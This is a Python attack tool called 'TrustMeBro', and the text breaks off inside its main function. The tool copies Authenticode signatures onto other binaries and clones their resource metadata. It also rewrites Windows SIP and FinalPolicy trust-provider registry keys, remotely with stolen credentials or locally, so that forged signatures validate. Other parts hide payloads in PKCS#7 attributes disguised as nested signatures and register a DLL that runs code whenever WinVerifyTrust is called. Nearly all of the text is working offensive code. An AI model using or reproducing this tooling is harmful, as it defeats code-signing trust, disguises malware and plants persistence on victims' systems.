#!/usr/bin/env python3
import sys
import struct
import shutil
import io
import argparse
import subprocess
import os
import uuid

try:
    from asn1crypto import cms, core
    HAS_ASN1CRYPTO = True
except ImportError:
    HAS_ASN1CRYPTO = False

# ==========================================
# PART 1: SigThief (Signature Stealing)
# ==========================================

def gather_file_info_win(binary):
    """
    Parses PE header to find the Certificate Table.
    """
    flItms = {}
    try:
        with open(binary, 'rb') as f:
            f.seek(int('3C', 16))
            flItms['pe_header_location'] = struct.unpack('<i', f.read(4))[0]
            
            # Start of COFF
            flItms['COFF_Start'] = flItms['pe_header_location'] + 4
            f.seek(flItms['COFF_Start'])
            flItms['MachineType'] = struct.unpack('<H', f.read(2))[0]
            
            f.seek(flItms['COFF_Start'] + 16, 0)
            flItms['SizeOfOptionalHeader'] = struct.unpack('<H', f.read(2))[0]
            flItms['Characteristics'] = struct.unpack('<H', f.read(2))[0]
            
            flItms['OptionalHeader_start'] = flItms['COFF_Start'] + 20

            f.seek(flItms['OptionalHeader_start'])
            flItms['Magic'] = struct.unpack('<H', f.read(2))[0]
            
            # Skip standard fields to get to Windows Specific Fields
            # Magic(2) + MajorLinker(1) + MinorLinker(1) + SizeOfCode(4) + SizeOfInitData(4) + SizeOfUninitData(4) + AddressOfEntryPoint(4) + BaseOfCode(4)
            # PE32 contains BaseOfData(4), PE32+ does not.
            
            if flItms['Magic'] == 0x20B: # PE32+
                f.seek(flItms['OptionalHeader_start'] + 24)
            else: # PE32
                f.seek(flItms['OptionalHeader_start'] + 28)
            
            # Windows Specific Fields
            # ImageBase(4/8) + SectionAlign(4) + FileAlign(4) + MajorOS(2) + MinorOS(2) + MajorImage(2) + MinorImage(2) + MajorSub(2) + MinorSub(2) + Win32Ver(4) + SizeOfImage(4) + SizeOfHeaders(4) + CheckSum(4) + Subsystem(2) + DllChar(2)
            
            if flItms['Magic'] == 0x20B:
                f.seek(8, 1) # ImageBase
            else:
                f.seek(4, 1) # ImageBase
                
            f.seek(40, 1) # Skip to Subsystem (approx) - let's be more precise if needed, but we just need Data Directories
            
            # Actually, let's just jump to Data Directories.
            # Optional Header Size is variable, but Data Directories are at the end.
            # We know the size of Optional Header.
            
            data_dir_start = flItms['OptionalHeader_start'] + flItms['SizeOfOptionalHeader'] - 128 # 16 directories * 8 bytes = 128 bytes
            # Wait, SizeOfOptionalHeader includes DataDirectories.
            
            # Security Directory is index 4 (5th entry).
            # Each entry is 8 bytes (RVA + Size).
            # Offset = Start of Data Dirs + (4 * 8)
            
            # Let's calculate start of Data Directories based on Magic
            # PE32: Standard(28) + Windows(68) = 96 bytes before Data Dirs
            # PE32+: Standard(24) + Windows(88) = 112 bytes before Data Dirs
            
            if flItms['Magic'] == 0x20B:
                data_dirs_offset = flItms['OptionalHeader_start'] + 112
            else:
                data_dirs_offset = flItms['OptionalHeader_start'] + 96
            
            # Security Dir is at index 4
            security_dir_offset = data_dirs_offset + (4 * 8)
            
            f.seek(security_dir_offset)
            flItms['CertLOC'] = struct.unpack("<I", f.read(4))[0] # VirtualAddress (actually File Offset for Certs)
            flItms['CertSize'] = struct.unpack("<I", f.read(4))[0]
            
            # Note: For Security Directory, VirtualAddress is actually a File Offset.
            flItms['CertTableLOC'] = security_dir_offset # Location in file where the pointer is stored
            
    except Exception as e:
        print(f"[-] Error parsing PE file: {e}")
        return None
        
    return flItms

def copy_cert(src):
    info = gather_file_info_win(src)
    if not info:
        return None
    
    if info['CertLOC'] == 0 or info['CertSize'] == 0:
        print("[-] Source file is not signed.")
        return None
        
    with open(src, 'rb') as f:
        f.seek(info['CertLOC'], 0)
        cert = f.read(info['CertSize'])
    return cert

def write_cert(cert, target, output):
    if not output:
        output = target + "_signed.exe"
        
    print(f"[*] Writing signed file to: {output}")
    
    # Only copy if target and output are different files
    if os.path.abspath(target) != os.path.abspath(output):
        shutil.copy2(target, output)
    
    info = gather_file_info_win(output)
    if not info:
        return False
        
    with open(output, 'r+b') as f:
        # Go to end of file
        f.seek(0, io.SEEK_END)
        file_size = f.tell()
        
        # Append Cert
        f.write(cert)
        
        # Update Certificate Table Pointer
        # We need to align the file size to 8 bytes usually, but SigThief just appends.
        # The VirtualAddress in Security Dir points to the file offset of the cert.
        
        # Update the Data Directory entry
        f.seek(info['CertTableLOC'], 0)
        f.write(struct.pack("<I", file_size)) # New Offset (End of original file)
        f.write(struct.pack("<I", len(cert))) # New Size
        
    return True

# ==========================================
# PART 2: Remote Hijack (TrustMeBro_Remote)
# ==========================================

SIPS = {
    "PE": "{C689AAB8-8E78-11D0-8C47-00C04FC295EE}",
    "Java": "{C689AAB9-8E78-11D0-8C47-00C04FC295EE}",
    "CAB": "{C689AABA-8E78-11D0-8C47-00C04FC295EE}",
    "MSI": "{000C10F1-0000-0000-C000-000000000046}",
    "PowerShell": "{603BCC1F-4B59-4E08-B724-D2C6297EF351}",
    "JScript": "{06C9E010-38CE-11D4-A2A3-00104BD35090}",
    "VBScript": "{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}",
    "WSF": "{1A610570-38CE-11D4-A2A3-00104BD35090}",
    "AppX": "{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}",
    "AppXBundle": "{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}",
    "EAppX": "{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}",
    "EAppXBundle": "{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}",
    "P7X": "{5598CFF1-68DB-4340-B57F-1CACF88C9A51}",
    "CTL": "{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}",
    "Flat": "{DE351A42-8E59-11D0-8C47-00C04FC295EE}",
    "Catalog": "{DE351A43-8E59-11D0-8C47-00C04FC295EE}",
    "ESD": "{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}",
}

DEFAULT_SIP_TYPES = ["PE", "PowerShell", "MSI"]

# Smart App Control SIP (Win11 only, separate from standard SIP hijack)
SAC_SIP = {
    "SmartAppControl": "{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}",
}

# Win11-only AppX extension SIP
WIN11_SIPS = {
    "AppXExtensions": "{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}",
}

ALL_SIPS = {**SIPS, **SAC_SIP, **WIN11_SIPS}
SIP_NAMES = sorted(ALL_SIPS.keys())

KEYS = []
for name, guid in SIPS.items():
    KEYS.append(f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
    KEYS.append(f"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")

HIJACK_CONFIG = {
    "Dll": "C:\\Windows\\System32\\ntdll.dll",
    "FuncName": "DbgUiContinue"
}

CLEAN_CONFIG = {
    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
    "FuncName": "CryptSIPVerifyIndirectData"
}

FINALPOLICY_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"

FINALPOLICY_HIJACK = {
    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
    "FuncName": "SoftpubCleanup"
}

FINALPOLICY_CLEAN = {
    "Dll": "C:\\Windows\\System32\\WINTRUST.DLL",
    "FuncName": "SoftpubAuthenticode"
}

FINALPOLICY_BASE_KEY = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy"

def find_reg_tool():
    """Find the reg.py tool in the system path."""
    tools = ["reg.py", "impacket-reg"]
    for tool in tools:
        if shutil.which(tool):
            return tool
    return None

def run_reg_cmd(reg_tool, target, key, value, data):
    """Execute reg.py to set a registry value."""
    cmd = [
        reg_tool, 
        target, 
        "add", 
        "-keyName", key, 
        "-v", value, 
        "-vt", "REG_SZ", 
        "-vd", data,
        "-force" # Force overwrite
    ]
    
    print(f"[*] Setting {key}\\{value} -> {data}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            # Check if it's just access denied or something else
            if "Access is denied" in result.stderr:
                 print(f"[-] Access Denied. Check credentials.")
            else:
                 print(f"[-] Error: {result.stderr.strip()}")
            return False
        else:
            print(f"[+] Success")
            return True
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return False

def delete_reg_key(reg_tool, target, key):
    """Execute reg.py to delete a registry key."""
    cmd = [
        reg_tool,
        target,
        "delete",
        "-keyName", key,
    ]

    print(f"[*] Deleting {key}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            if "Access is denied" in result.stderr:
                print("[-] Access Denied. Check credentials.")
            else:
                print(f"[-] Error: {result.stderr.strip()}")
            return False
        print("[+] Success")
        return True
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return False

def local_reg_set(key, value, data):
    """Write a registry value on the local Windows machine via winreg."""
    try:
        import winreg
    except ImportError:
        print("[-] winreg not available. --local requires Windows.")
        return False
    # key format: HKLM\SOFTWARE\...
    parts = key.split("\\", 1)
    root_map = {"HKLM": winreg.HKEY_LOCAL_MACHINE, "HKCU": winreg.HKEY_CURRENT_USER}
    root = root_map.get(parts[0])
    if not root or len(parts) < 2:
        print(f"[-] Invalid key: {key}")
        return False
    subkey = parts[1]
    try:
        hkey = winreg.CreateKeyEx(root, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(hkey, value, 0, winreg.REG_SZ, data)
        winreg.CloseKey(hkey)
        if g_verbose:
            print(f"[+] Set {key}\\{value} = {data}")
        return True
    except OSError as e:
        print(f"[-] RegSetValueEx failed on {key}\\{value}: {e}")
        return False

# Verbose flag for local mode
g_verbose = False

def write_reg(args, key, value, data, dry_run=False):
    """Unified registry write: local or remote based on args."""
    if dry_run:
        print(f"[dry-run] Would set {key}\\{value} = {data}")
        return True
    if getattr(args, 'local', False):
        return local_reg_set(key, value, data)
    else:
        return run_reg_cmd(args._reg_tool, args._target_str, key, value, data)

def normalize_provider_guid(provider_guid):
    provider_guid = provider_guid.strip()
    if not provider_guid.startswith("{"):
        provider_guid = "{" + provider_guid
    if not provider_guid.endswith("}"):
        provider_guid = provider_guid + "}"
    return provider_guid

# ==========================================
# PART 3: Metadata Cloning (Linux/Objcopy)
# ==========================================

def get_section_rva(pe_path, section_name):
    """
    Returns the Virtual Address (RVA) of a section by name.
    """
    try:
        with open(pe_path, 'rb') as f:
            f.seek(int('3C', 16))
            pe_header_loc = struct.unpack('<i', f.read(4))[0]
            coff_start = pe_header_loc + 4
            
            f.seek(coff_start + 2)
            num_sections = struct.unpack('<H', f.read(2))[0]
            
            f.seek(coff_start + 16)
            size_of_opt_header = struct.unpack('<H', f.read(2))[0]
            
            opt_header_start = coff_start + 20
            section_table_start = opt_header_start + size_of_opt_header
            
            f.seek(section_table_start)
            
            for i in range(num_sections):
                name = f.read(8).rstrip(b'\x00')
                if name == section_name.encode():
                    f.seek(4, 1) # Skip VirtualSize
                    return struct.unpack('<I', f.read(4))[0] # VirtualAddress
                f.seek(32, 1) # Skip rest
    except:
        pass
    return 0

def fix_resource_rvs(target_path, old_rva, new_rva):
    """
    Walks the Resource Tree in the target file and updates Data Entry RVAs.
    delta = new_rva - old_rva
    """
    delta = new_rva - old_rva
    if delta == 0:
        return True
        
    print(f"[*] Relocating Resource Directory (Delta: {delta})...")
    
    try:
        with open(target_path, 'r+b') as f:
            # Find the file offset of the .rsrc section
            # We need to map RVA to File Offset
            f.seek(int('3C', 16))
            pe_header_loc = struct.unpack('<i', f.read(4))[0]
            coff_start = pe_header_loc + 4
            f.seek(coff_start + 2)
            num_sections = struct.unpack('<H', f.read(2))[0]
            f.seek(coff_start + 16)
            size_of_opt_header = struct.unpack('<H', f.read(2))[0]
            section_table_start = coff_start + 20 + size_of_opt_header
            
            f.seek(section_table_start)
            rsrc_raw_ptr = 0
            
            for i in range(num_sections):
                name = f.read(8).rstrip(b'\x00')
                if name == b'.rsrc':
                    f.seek(12, 1) # Skip VSize, VA, RSize
                    rsrc_raw_ptr = struct.unpack('<I', f.read(4))[0] # PointerToRawData
                    break
                f.seek(32, 1)
            
            if rsrc_raw_ptr == 0:
                print("[-] Error: Could not find .rsrc section raw pointer for relocation.")
                return False
                
            # Recursive function to walk the tree
            def walk_directory(offset):
                # Read Directory Table
                f.seek(rsrc_raw_ptr + offset + 12)
                num_named = struct.unpack('<H', f.read(2))[0]
                num_id = struct.unpack('<H', f.read(2))[0]
                total = num_named + num_id
                
                current_entry_pos = rsrc_raw_ptr + offset + 16
                
                for _ in range(total):
                    f.seek(current_entry_pos + 4) # Skip Name/ID
                    entry_val = struct.unpack('<I', f.read(4))[0]
                    
                    if entry_val & 0x80000000: # Is Directory
                        subdir_offset = entry_val & 0x7FFFFFFF
                        walk_directory(subdir_offset)
                    else: # Is Data Entry
                        data_entry_offset = entry_val
                        # Go to Data Entry
                        f.seek(rsrc_raw_ptr + data_entry_offset)
                        old_data_rva = struct.unpack('<I', f.read(4))[0]
                        
                        # Apply Delta and Mask to 32-bit
                        new_data_rva = (old_data_rva + delta) & 0xFFFFFFFF
                        
                        # Write new RVA
                        f.seek(rsrc_raw_ptr + data_entry_offset)
                        f.write(struct.pack('<I', new_data_rva))
                        
                    current_entry_pos += 8 # Next Entry
            
            walk_directory(0)
            print("[+] Resource RVAs relocated.")
            return True
            
    except Exception as e:
        print(f"[-] Failed to relocate resources: {e}")
        return False

def fix_resource_table(target):
    """
    Updates the Resource Data Directory in the Optional Header to point to the .rsrc section.
    """
    print("[*] Fixing Resource Data Directory...")
    try:
        with open(target, 'r+b') as f:
            # 1. Parse Headers to find Section Table
            f.seek(int('3C', 16))
            pe_header_loc = struct.unpack('<i', f.read(4))[0]
            
            # COFF Header
            coff_start = pe_header_loc + 4
            f.seek(coff_start + 2)
            num_sections = struct.unpack('<H', f.read(2))[0]
            
            f.seek(coff_start + 16)
            size_of_opt_header = struct.unpack('<H', f.read(2))[0]
            
            opt_header_start = coff_start + 20
            
            # Determine Magic for Data Directory Offset
            f.seek(opt_header_start)
            magic = struct.unpack('<H', f.read(2))[0]
            
            # Data Directory Offset for Resources (Index 2)
            if magic == 0x20B:
                data_dirs_start = opt_header_start + 112
            else:
                data_dirs_start = opt_header_start + 96
                
            resource_dir_offset = data_dirs_start + (2 * 8) # Index 2
            
            # 2. Find .rsrc section in Section Table
            section_table_start = opt_header_start + size_of_opt_header
            f.seek(section_table_start)
            
            rsrc_va = 0
            rsrc_size = 0
            
            for i in range(num_sections):
                name = f.read(8).rstrip(b'\x00')
                if name == b'.rsrc':
                    virtual_size = struct.unpack('<I', f.read(4))[0]
                    virtual_address = struct.unpack('<I', f.read(4))[0]
                    rsrc_va = virtual_address
                    rsrc_size = virtual_size
                    break
                else:
                    f.seek(32, 1)
            
            if rsrc_va == 0:
                print("[-] Error: .rsrc section not found in Section Table.")
                return False
                
            # 3. Update Data Directory
            print(f"[*] Updating Resource Directory -> VA: 0x{rsrc_va:X}, Size: 0x{rsrc_size:X}")
            f.seek(resource_dir_offset)
            f.write(struct.pack('<I', rsrc_va))
            f.write(struct.pack('<I', rsrc_size))
            
            return True
            
    except Exception as e:
        print(f"[-] Failed to fix resource table: {e}")
        return False

def clone_metadata(source, target, objcopy_path=None):
    """
    Clones the .rsrc section from source to target using objcopy.
    """
    # Try to find a suitable objcopy
    if objcopy_path is None:
        if shutil.which("x86_64-w64-mingw32-objcopy"):
            objcopy_path = "x86_64-w64-mingw32-objcopy"
        elif shutil.which("objcopy"):
            objcopy_path = "objcopy"
        else:
            print("[-] Error: No suitable 'objcopy' found. Please install binutils or mingw-w64-tools.")
            return False

    print(f"[*] Cloning resources from {source} to {target} using {objcopy_path}...")
    
    # 1. Get Old RVA from Source
    old_rva = get_section_rva(source, ".rsrc")
    if old_rva == 0:
        print("[-] Could not find .rsrc in source.")
        return False

    try:
        # 2. Extract .rsrc from source
        rsrc_tmp = "rsrc_tmp.bin"
        cmd_extract = [
            objcopy_path,
            "-O", "binary",
            "--only-section=.rsrc",
            source,
            rsrc_tmp
        ]
        subprocess.run(cmd_extract, check=True, capture_output=True)

        if not os.path.exists(rsrc_tmp) or os.path.getsize(rsrc_tmp) == 0:
             print("[-] Failed to extract .rsrc section.")
             if os.path.exists(rsrc_tmp): os.remove(rsrc_tmp)
             return False

        # 3. Remove .rsrc from target (to ensure clean slate)
        # This is more reliable than --update-section which can fail if sizes differ significantly
        cmd_remove = [
            objcopy_path,
            "--remove-section", ".rsrc",
            target
        ]
        subprocess.run(cmd_remove, check=False, capture_output=True)

        # 4. Add .rsrc to target
        cmd_add = [
            objcopy_path,
            "--add-section", f".rsrc={rsrc_tmp}",
            "--set-section-flags", ".rsrc=alloc,load,data",
            target
        ]
        subprocess.run(cmd_add, check=True, capture_output=True)
        
        os.remove(rsrc_tmp)
        print("[+] Metadata (resources) cloned successfully.")
        
        # 5. Fix Data Directory
        fix_resource_table(target)
        
        # 6. Fix Resource RVAs (Relocation)
        new_rva = get_section_rva(target, ".rsrc")
        if new_rva != 0:
            fix_resource_rvs(target, old_rva, new_rva)
            
        return True

    except subprocess.CalledProcessError as e:
        print(f"[-] Objcopy failed: {e}")
        if os.path.exists("rsrc_tmp.bin"):
            os.remove("rsrc_tmp.bin")
        return False
    except Exception as e:
        print(f"[-] Metadata cloning failed: {e}")
        return False

# ==========================================
# PART 4: PKCS#7 Unauthenticated Attribute Embedding (SigStash)
# ==========================================

PKCS7_DEFAULT_OID = "1.3.6.1.4.1.311.99.1"
SPC_NESTED_SIGNATURE_OID = "1.3.6.1.4.1.311.2.4.1"

def _require_asn1crypto():
    if not HAS_ASN1CRYPTO:
        print("[-] Error: 'asn1crypto' is required for embed/extract commands.")
        print("    Install with: pip install asn1crypto")
        sys.exit(1)

def read_pe_pkcs7(data: bytes, signer_index: int = 0):
    """Extract PKCS#7 blob from PE's WIN_CERTIFICATE entries.

    Returns (cert_dir_offset, cert_rva, total_cert_size, entries, target_index)
    where entries is a list of (entry_offset, entry_length, pkcs7_bytes) tuples.
    target_index is the resolved signer_index (handles -1 = last/SHA-256 default).
    """
    if data[:2] != b'MZ':
        raise ValueError("Not a PE file")
    pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
        raise ValueError("Invalid PE signature")
    magic = struct.unpack_from('<H', data, pe_offset + 0x18)[0]
    if magic == 0x20b:
        cert_dir_offset = pe_offset + 0x18 + 0x90
    elif magic == 0x10b:
        cert_dir_offset = pe_offset + 0x18 + 0x80
    else:
        raise ValueError(f"Unknown PE magic: {magic:#x}")
    cert_rva = struct.unpack_from('<I', data, cert_dir_offset)[0]
    cert_size = struct.unpack_from('<I', data, cert_dir_offset + 4)[0]
    if cert_rva == 0 or cert_size == 0:
        raise ValueError("PE has no embedded signature")

    # Parse all WIN_CERTIFICATE entries (they are 8-byte aligned, concatenated)
    entries = []
    pos = cert_rva
    end = cert_rva + cert_size
    while pos + 8 <= end:
        dw_length = struct.unpack_from('<I', data, pos)[0]
        if dw_length < 8:
            break
        w_type = struct.unpack_from('<H', data, pos + 6)[0]
        if w_type == 0x0002:
            pkcs7_bytes = data[pos + 8 : pos + dw_length]
            entries.append((pos, dw_length, pkcs7_bytes))
        # Advance to next entry (8-byte aligned)
        aligned = dw_length + ((8 - (dw_length % 8)) % 8)
        pos += aligned

    if not entries:
        raise ValueError("No PKCS#7 WIN_CERTIFICATE entries found")

    if signer_index == -1:
        # Default: last entry (typically SHA-256 in dual-signed PEs)
        signer_index = len(entries) - 1
    if signer_index >= len(entries):
        raise ValueError(f"Signer index {signer_index} out of range (PE has {len(entries)} signature(s))")

    if len(entries) > 1:
        print(f"[*] Dual-signed PE detected: {len(entries)} WIN_CERTIFICATE entries, targeting index {signer_index}")

    return cert_dir_offset, cert_rva, cert_size, entries, signer_index

def _der_length(length: int) -> bytes:
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    elif length < 0x10000:
        return bytes([0x82, length >> 8, length & 0xFF])
    elif length < 0x1000000:
        return bytes([0x83, length >> 16, (length >> 8) & 0xFF, length & 0xFF])
    else:
        return bytes([0x84, length >> 24, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])

def pkcs7_embed_payload(signed_data, payload: bytes, oid: str):
    """Add payload as unauthenticated attribute to first SignerInfo."""
    signer = signed_data['signer_infos'][0]
    oid_der = core.ObjectIdentifier(oid).dump()
    octet_der = core.OctetString(payload).dump()
    set_der = b'\x31' + _der_length(len(octet_der)) + octet_der
    seq_der = b'\x30' + _der_length(len(oid_der) + len(set_der)) + oid_der + set_der
    attr_value = cms.CMSAttribute.load(seq_der)
    existing = signer['unsigned_attrs']
    if existing.native is None:
        new_attrs = cms.CMSAttributes([attr_value])
    else:
        attrs_list = [a for a in existing if a['type'].dotted != oid]
        attrs_list.append(attr_value)
        new_attrs = cms.CMSAttributes(attrs_list)
    signer['unsigned_attrs'] = new_attrs
    return signed_data

def pkcs7_extract_payload(signed_data, oid: str):
    """Extract payload from unauthenticated attribute with given OID."""
    signer = signed_data['signer_infos'][0]
    unsigned = signer['unsigned_attrs']
    if unsigned.native is None:
        return None
    for attr in unsigned:
        if attr['type'].dotted == oid:
            values = attr['values']
            if len(values) > 0:
                try:
                    return core.OctetString.load(values[0].dump()).native
                except Exception:
                    return values[0].dump()
    return None

def _wrap_as_nested_sig(payload: bytes) -> bytes:
    """Wrap payload in a fake SignedData ContentInfo for SPC_NESTED_SIGNATURE camouflage."""
    fake_sd = cms.SignedData({
        'version': 'v1',
        'digest_algorithms': [{'algorithm': 'sha256'}],
        'encap_content_info': {
            'content_type': 'data',
            'content': payload,
        },
        'certificates': [],
        'signer_infos': [],
    })
    fake_ci = cms.ContentInfo({
        'content_type': 'signed_data',
        'content': fake_sd,
    })
    return fake_ci.dump()

def _unwrap_nested_sig(attr_der: bytes) -> bytes | None:
    """Extract payload from a fake nested SignedData ContentInfo."""
    try:
        ci = cms.ContentInfo.load(attr_der)
        sd = ci['content']
        content = sd['encap_content_info']['content']
        if content.native is not None:
            return content.native
        return content.parsed if hasattr(content, 'parsed') else bytes(content)
    except Exception:
        return None

def pkcs7_embed_camouflage(signed_data, payload: bytes):
    """Embed payload as a fake SPC_NESTED_SIGNATURE unauthenticated attribute."""
    signer = signed_data['signer_infos'][0]
    nested_der = _wrap_as_nested_sig(payload)
    oid_der = core.ObjectIdentifier(SPC_NESTED_SIGNATURE_OID).dump()
    set_der = b'\x31' + _der_length(len(nested_der)) + nested_der
    seq_der = b'\x30' + _der_length(len(oid_der) + len(set_der)) + oid_der + set_der
    attr_value = cms.CMSAttribute.load(seq_der)
    existing = signer['unsigned_attrs']
    if existing.native is None:
        new_attrs = cms.CMSAttributes([attr_value])
    else:
        attrs_list = [a for a in existing if a['type'].dotted != SPC_NESTED_SIGNATURE_OID]
        attrs_list.append(attr_value)
        new_attrs = cms.CMSAttributes(attrs_list)
    signer['unsigned_attrs'] = new_attrs
    return signed_data

def pkcs7_extract_camouflage(signed_data) -> bytes | None:
    """Extract payload from SPC_NESTED_SIGNATURE camouflage attribute."""
    signer = signed_data['signer_infos'][0]
    unsigned = signer['unsigned_attrs']
    if unsigned.native is None:
        return None
    for attr in unsigned:
        if attr['type'].dotted == SPC_NESTED_SIGNATURE_OID:
            values = attr['values']
            if len(values) > 0:
                return _unwrap_nested_sig(values[0].dump())
    return None

def rebuild_pe_cert(original_data: bytes, cert_dir_offset: int, cert_rva: int,
                    entries: list, target_index: int, new_pkcs7: bytes) -> bytes:
    """Rebuild PE with modified PKCS7 in one entry, preserving other entries."""
    result = bytearray(original_data[:cert_rva])

    for i, (entry_off, entry_len, _pkcs7) in enumerate(entries):
        if i == target_index:
            dw_length = 8 + len(new_pkcs7)
            padding = (8 - (dw_length % 8)) % 8
            wc = struct.pack('<IHH', dw_length, 0x0200, 0x0002) + new_pkcs7 + b'\x00' * padding
        else:
            # Preserve original entry with its 8-byte alignment
            aligned = entry_len + ((8 - (entry_len % 8)) % 8)
            wc = original_data[entry_off : entry_off + aligned]
        result.extend(wc)

    total_cert_size = len(result) - cert_rva
    struct.pack_into('<I', result, cert_dir_offset, cert_rva)
    struct.pack_into('<I', result, cert_dir_offset + 4, total_cert_size)
    return bytes(result)

# ==========================================
# PART 5: Main Entry Point
# ==========================================

def main():
    parser = argparse.ArgumentParser(description="TrustMeBro - Unified Signature Tool (Steal & Hijack)")
    subparsers = parser.add_subparsers(dest="command", help="Command to run")

    # Subcommand: steal (file operations only, no registry)
    steal_parser = subparsers.add_parser("steal", help="Steal signature from source and apply to target")
    steal_parser.add_argument("-s", "--source", required=True, help="Signed source binary")
    steal_parser.add_argument("-t", "--target", required=True, help="Target binary to sign")
    steal_parser.add_argument("-o", "--output", help="Output file path (default: target_signed.exe)")
    steal_parser.add_argument("--clone", action="store_true", help="Clone metadata (resources) from source to target")
    steal_parser.add_argument("--dry-run", action="store_true", help="Print what would happen without writing")

    # Subcommand: hijack (remote by default, --local for local machine)
    hijack_parser = subparsers.add_parser("hijack", help="Install SIP or FinalPolicy persistence")
    hijack_parser.add_argument("target_ip", nargs="?", default=None, help="Target IP/Hostname (required unless --local)")
    hijack_parser.add_argument("-u", "--user", help="Username (DOMAIN/User or User)")
    hijack_parser.add_argument("-p", "--password", help="Password")
    hijack_parser.add_argument("--local", action="store_true", help="Run on local machine (no IP/creds needed, uses winreg)")
    hijack_parser.add_argument("--action", choices=["hijack", "clean", "finalpolicy", "finalpolicy-clean", "custom-provider", "custom-provider-clean"], default="hijack", help="Action to perform")
    hijack_parser.add_argument("--provider-guid", help="Provider GUID for custom-provider/custom-provider-clean (default: random)")
    hijack_parser.add_argument("--tool", help="Path to reg.py if not in PATH (remote mode only)")
    hijack_parser.add_argument("--wow64-only", action="store_true", help="Write only to WOW6432Node (32-bit callers)")
    hijack_parser.add_argument("--sac", action="store_true", help="Include Smart App Control SIP (Win11)")
    hijack_parser.add_argument("--all-sips", action="store_true", help="Include all 19 SIP GUIDs")
    hijack_parser.add_argument("--sip-types", help=f"Comma-separated SIP types (default: PE,PowerShell,MSI). Use 'all' for all 17. Available: {','.join(sorted(SIPS.keys()))}")
    hijack_parser.add_argument("--dry-run", action="store_true", help="Print what would happen without writing")

    # Subcommand: embed
    embed_parser = subparsers.add_parser("embed", help="Embed payload in PKCS#7 unauthenticated attributes (signature stays valid)")
    embed_parser.add_argument("-s", "--source", required=True, help="Signed PE to embed into")
    embed_parser.add_argument("-p", "--payload", required=True, help="Payload file to embed")
    embed_parser.add_argument("-o", "--output", required=True, help="Output PE path")
    embed_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"Custom OID (default: {PKCS7_DEFAULT_OID})")
    embed_parser.add_argument("--camouflage", action="store_true", help="Wrap payload as a fake SPC_NESTED_SIGNATURE (blends with dual-signed PEs)")
    embed_parser.add_argument("--signer-index", type=int, default=-1, help="WIN_CERTIFICATE entry index to embed into (-1 = last/SHA-256, 0 = first)")

    # Subcommand: extract
    extract_parser = subparsers.add_parser("extract", help="Extract embedded payload from PKCS#7 unauthenticated attributes")
    extract_parser.add_argument("-s", "--source", required=True, help="PE with embedded payload")
    extract_parser.add_argument("-o", "--output", required=True, help="Output payload file")
    extract_parser.add_argument("--oid", default=PKCS7_DEFAULT_OID, help=f"OID to extract (default: {PKCS7_DEFAULT_OID})")
    extract_parser.add_argument("--camouflage", action="store_true", help="Extract from SPC_NESTED_SIGNATURE camouflage wrapper")
    extract_parser.add_argument("--signer-index", type=int, default=-1, help="WIN_CERTIFICATE entry index to extract from (-1 = last, 0 = first)")

    # Subcommand: sip-exec
    sipexec_parser = subparsers.add_parser("sip-exec", help="Register a DLL as CryptSIPDllIsMyFileType2 handler (code exec on WinVerifyTrust calls)")
    sipexec_parser.add_argument("--dll", required=True, help="Full path to DLL on target (e.g. C:\\Temp\\payload.dll)")
    sipexec_parser.add_argument("--funcname", default="IsMyFileType2", help="Export function name (default: IsMyFileType2)")
    sipexec_parser.add_argument("--guid", help="SIP GUID to register (default: random)")
    sipexec_parser.add_argument("--clean", action="store_true", help="Remove the registered SIP GUID")

    args = parser.parse_args()

    if args.command == "steal":
        if getattr(args, 'dry_run', False):
            print(f"[dry-run] Would steal signature from {args.source} to {args.target}")
            if args.clone:
                print("[dry-run] Would clone metadata")
            sys.exit(0)

        output_file = args.output if args.output else args.target + "_signed.exe"
        shutil.copy2(args.target, output_file)
        
        if args.clone:
            if not clone_metadata(args.source, output_file):
                print("[-] Metadata cloning failed. Continuing with signature steal.")

        print(f"[*] Stealing signature from {args.source}...")
        cert = copy_cert(args.source)
        if cert:
            print(f"[+] Signature extracted ({len(cert)} bytes).")
            if write_cert(cert, output_file, output_file):
                print(f"[+] Signature stolen to {output_file}")
                print("[*] Signature will not validate without SIP hijack or FinalPolicy.")
                print("[*] Run: TrustMeBro.py hijack ... --action hijack  to make it validate.")
            else:
                print("[-] Failed to write signature.")
        else:
            print("[-] Failed to extract signature.")

    elif args.command == "hijack":
        dry_run = getattr(args, 'dry_run', False)

        # Resolve execution mode: --local or remote
        if getattr(args, 'local', False):
            global g_verbose
            g_verbose = False
            args._reg_tool = None
            args._target_str = None
            print("[*] Local mode: writing to local registry.")
        else:
            # Remote mode: require target_ip, user, password
            if not args.target_ip:
                print("[-] Remote mode requires a target IP. Use --local for local machine.")
                print("    Example: TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass")
                sys.exit(1)
            if not args.user or not args.password:
                print("[-] Remote mode requires -u/--user and -p/--password.")
                sys.exit(1)

            if "/" in args.user:
                domain, user = args.user.split("/", 1)
            else:
